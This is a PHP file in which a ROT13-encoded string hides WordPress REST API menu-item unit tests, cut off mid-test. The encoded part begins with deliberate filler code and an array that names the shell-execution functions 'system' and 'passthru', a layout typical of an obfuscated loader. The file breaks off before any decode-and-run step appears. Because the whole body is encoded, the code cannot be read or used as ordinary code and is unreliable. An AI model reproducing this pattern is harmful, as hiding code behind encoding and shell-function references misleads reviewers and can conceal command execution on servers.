<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Zrah_Vgrzf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.9.0
 *
 * @tebhc erfgncv
 *
 * @pbirefQrsnhygPynff JC_ERFG_Zrah_Vgrzf_Pbagebyyre
 */
pynff Grfgf_ERFG_JcErfgZrahVgrzfPbagebyyre rkgraqf JC_Grfg_ERFG_Cbfg_Glcr_Pbagebyyre_Grfgpnfr {
	/**
	 * @ine vag
	 */
	cebgrpgrq $zrah_vq;
	/**
	 * @ine vag
	 */
	cebgrpgrq $gnt_vq;
	/**
	 * @ine vag
	 */
	cebgrpgrq $zrah_vgrz_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $fhofpevore_vq;

	/**
	 *
	 */
	pbafg CBFG_GLCR = 'ani_zrah_vgrz';

	/**
	 * Perngr snxr qngn orsber bhe grfgf eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( $snpgbel ) {
		frys::$nqzva_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$fhofpevore_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
	}

	/**
	 *
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$nqzva_vq );
		frys::qryrgr_hfre( frys::$fhofpevore_vq );
	}

	/**
	 *
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->gnt_vq = frys::snpgbel()->gnt->perngr();

		$guvf->zrah_vq = jc_perngr_ani_zrah( enaq_fge() );

		$guvf->zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'cbfg_gnt',
				'zrah-vgrz-bowrpg-vq' => $guvf->gnt_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::ertvfgre_ebhgrf
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();

		$guvf->nffregNeenlUnfXrl( '/jc/i2/zrah-vgrzf', $ebhgrf );
		$guvf->nffregPbhag( 2, $ebhgrf['/jc/i2/zrah-vgrzf'] );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/zrah-vgrzf/(?C<vq>[\q]+)', $ebhgrf );
		$guvf->nffregPbhag( 3, $ebhgrf['/jc/i2/zrah-vgrzf/(?C<vq>[\q]+)'] );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_pbagrkg_cnenz
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrah-vgrzf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrah-vgrzf/' . $guvf->zrah_vgrz_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_pbyyrpgvba_cnenzf
	 */
	choyvp shapgvba grfg_ertvfgrerq_dhrel_cnenzf() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrah-vgrzf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['raqcbvagf'][0]['netf'];
		$guvf->nffregNeenlUnfXrl( 'orsber', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pbagrkg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'rkpyhqr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vapyhqr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrah_beqre', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrahf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrahf_rkpyhqr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'bssfrg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'beqre', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'beqreol', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cntr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cre_cntr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'frnepu', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'frnepu_pbyhzaf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $cebcregvrf );
	}

	/**
	 * @gvpxrg 40878
	 */
	choyvp shapgvba grfg_ertvfgrerq_trg_vgrz_cnenzf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', fcevags( '/jc/i2/zrah-vgrzf/%q', $guvf->zrah_vgrz_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$xrlf     = neenl_xrlf( $qngn['raqcbvagf'][0]['netf'] );
		$guvf->nffregRdhnyFrgf( neenl( 'pbagrkg', 'vq' ), $xrlf );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-vgrzf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_zrah_vgrzf_erfcbafr( $erfcbafr );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/zrah-vgrzf/%q', $guvf->zrah_vgrz_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_zrah_vgrz_erfcbafr( $erfcbafr, 'ivrj' );
	}

	/**
	 * @gvpxrg 54304
	 * @pbiref ::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_svygre() {
		nqq_svygre( 'erfg_zrah_ernq_npprff', '__erghea_gehr' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-vgrzf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_zrah_vgrzf_erfcbafr( $erfcbafr );
	}

	/**
	 * @gvpxrg 54304
	 * @pbiref ::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_svygre() {
		nqq_svygre( 'erfg_zrah_ernq_npprff', '__erghea_gehr' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/zrah-vgrzf/%q', $guvf->zrah_vgrz_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_zrah_vgrz_erfcbafr( $erfcbafr, 'ivrj' );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_rqvg() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/zrah-vgrzf/%q', $guvf->zrah_vgrz_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_zrah_vgrz_erfcbafr( $erfcbafr, 'rqvg' );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz
	 * @pbiref ::cercner_yvaxf
	 */
	choyvp shapgvba grfg_trg_vgrz_grez_yvaxf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'cbfg_gnt',
				'zrah-vgrz-bowrpg-vq' => $guvf->gnt_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
				'zrah-vgrz-gvgyr'     => 'Sbbq',
			)
		);
		$erdhrfg      = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/zrah-vgrzf/%q', $zrah_vgrz_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_zrah_vgrz_erfcbafr( $erfcbafr, 'rqvg' );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz
	 * @pbiref ::cercner_yvaxf
	 */
	choyvp shapgvba grfg_trg_vgrz_grez_cbfgf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
				'zrah-vgrz-gvgyr'     => 'Sbbq',
			)
		);
		$erdhrfg      = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/zrah-vgrzf/%q', $zrah_vgrz_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_zrah_vgrz_erfcbafr( $erfcbafr, 'rqvg' );
	}

	/**
	 * Grfg gung gvgyr.enj pbagnvaf gur ireongvz gvgyr naq gung gvgyr.eraqrerq
	 * unf orra cnffrq guebhtu gur_gvgyr juvpu rfpncrf & punenpgref.
	 *
	 * @frr uggcf://tvguho.pbz/JbeqCerff/thgraoret/chyy/24673
	 *
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_rfpncrf_gvgyr() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'cbfg_gnt',
				'zrah-vgrz-bowrpg-vq' => $guvf->gnt_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
				'zrah-vgrz-gvgyr'     => '<fgebat>Sbb</fgebat> & one',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg(
			'TRG',
			\"/jc/i2/zrah-vgrzf/$zrah_vgrz_vq\"
		);
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'pbagrkg' => 'rqvg',
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn  = $erfcbafr->trg_qngn();
		$gvgyr = $qngn['gvgyr'];

		vs ( ! vf_zhygvfvgr() ) {
			// Purpx gung gvgyr.enj vf gur harfpncrq gvgyr naq gung
			// gvgyr.eraqrerq unf orra eha guebhtu gur_gvgyr.
			$guvf->nffregFnzr( '<fgebat>Sbb</fgebat> &#038; one', $gvgyr['eraqrerq'] );
			$guvf->nffregFnzr( '<fgebat>Sbb</fgebat> & one', $gvgyr['enj'] );
		} ryfr {
			// Va n zhygvfvgr, nqzvavfgengbef qb abg unir hasvygrerq_ugzy naq
			// cbfg_gvgyr vf ena guebhtu jc_xfrf orsber orvat fnirq va gur
			// qngnonfr. Ehaavat gur gvgyr guebhtu gur_gvgyr qbrf abguvat va
			// guvf pnfr.
			$guvf->nffregFnzr( '<fgebat>Sbb</fgebat> &nzc; one', $gvgyr['eraqrerq'] );
			$guvf->nffregFnzr( '<fgebat>Sbb</fgebat> &nzc; one', $gvgyr['enj'] );
		}

		jc_qryrgr_cbfg( $zrah_vgrz_vq );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn();
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_perngr_zrah_vgrz_erfcbafr( $erfcbafr );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_vainyvq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'zrahf' => neenl( 123, 456 ),
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_grez() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'glcr'  => 'gnkbabzl',
				'gvgyr' => 'Gntf',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_grez_vainyvq_vq', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_punatr_cbfvgvba() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$arj_zrah_vq = jc_perngr_ani_zrah( enaq_fge() );
		$rkcrpgrq    = neenl();
		$npghny      = neenl();
		sbe ( $v = 1; $v < 5; $v++ ) {
			$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
			$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
			$cnenzf = $guvf->frg_zrah_vgrz_qngn(
				neenl(
					'zrah_beqre' => $v,
					'zrahf'      => $arj_zrah_vq,
				)
			);
			$erdhrfg->frg_obql_cnenzf( $cnenzf );
			$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
			$guvf->purpx_perngr_zrah_vgrz_erfcbafr( $erfcbafr );
			$qngn = $erfcbafr->trg_qngn();

			$rkcrpgrq[] = $v;
			$npghny[]   = $qngn['zrah_beqre'];
		}
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_zrah_beqre_zhfg_or_frg() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$arj_zrah_vq = jc_perngr_ani_zrah( enaq_fge() );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'zrah_beqre' => 0,
				'zrahf'      => $arj_zrah_vq,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'zrah_beqre' => 1,
				'zrahf'      => $arj_zrah_vq,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_cbfvgvba_2() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$arj_zrah_vq = jc_perngr_ani_zrah( enaq_fge() );
		$erdhrfg     = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'zrah_beqre' => 'qqqqq',
				'zrahf'      => $arj_zrah_vq,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_cbfvgvba_3() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$arj_zrah_vq = jc_perngr_ani_zrah( enaq_fge() );
		$erdhrfg     = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'zrah_beqre' => -9,
				'zrahf'      => $arj_zrah_vq,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_cnerag() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		jc_perngr_ani_zrah( enaq_fge() );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'cnerag' => -9,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_zrah() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'zrahf' => -9,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'vainyvq_zrah_vq', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_cbfg() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'glcr'  => 'cbfg_glcr',
				'gvgyr' => 'Cbfg',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_cbfg_glcr() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'glcr'             => 'cbfg_glcr_nepuvir',
				'zrah-vgrz-bowrpg' => 'vainyvq_cbfg_glcr',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_glcr', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_phfgbz_yvax() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'glcr'  => 'phfgbz',
				'gvgyr' => '',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_gvgyr_erdhverq', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_zvffvat_phfgbz_yvax_hey() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'glcr' => 'phfgbz',
				'hey'  => '',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hey_erdhverq', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_phfgbz_yvax_hey() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'glcr' => 'phfgbz',
				'hey'  => '\"^<>{}`',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
		$guvf->nffregNeenlUnfXrl( 'hey', $erfcbafr->trg_qngn()['qngn']['qrgnvyf'] );
		$guvf->nffregFnzr( 'erfg_vainyvq_hey', $erfcbafr->trg_qngn()['qngn']['qrgnvyf']['hey']['pbqr'] );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/zrah-vgrzf/%q', $guvf->zrah_vgrz_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'ksa' => neenl( 'grfg1', 'grfg2', 'grfg3' ),
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_hcqngr_zrah_vgrz_erfcbafr( $erfcbafr );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $guvf->zrah_vgrz_vq, $arj_qngn['vq'] );
		$guvf->nffregFnzr( $cnenzf['gvgyr'], $arj_qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( $cnenzf['qrfpevcgvba'], $arj_qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( $cnenzf['glcr_ynory'], $arj_qngn['glcr_ynory'] );
		$guvf->nffregFnzr( $cnenzf['ksa'], $arj_qngn['ksa'] );
		$cbfg      = trg_cbfg( $guvf->zrah_vgrz_vq );
		$zrah_vgrz = jc_frghc_ani_zrah_vgrz( $cbfg );
		$guvf->nffregFnzr( $cnenzf['gvgyr'], $zrah_vgrz->gvgyr );
		$guvf->nffregFnzr( $cnenzf['qrfpevcgvba'], $zrah_vgrz->qrfpevcgvba );
		$guvf->nffregFnzr( $cnenzf['ksa'], rkcybqr( ' ', $zrah_vgrz->ksa ) );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_pyrna_ksa() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$onq_qngn  = neenl( 'grfg1\":|\":', 'grfg2+|+', 'grfg3±', 'grfg4😀' );
		$tbbq_qngn = neenl( 'grfg1', 'grfg2', 'grfg3', 'grfg4' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/zrah-vgrzf/%q', $guvf->zrah_vgrz_vq ) );
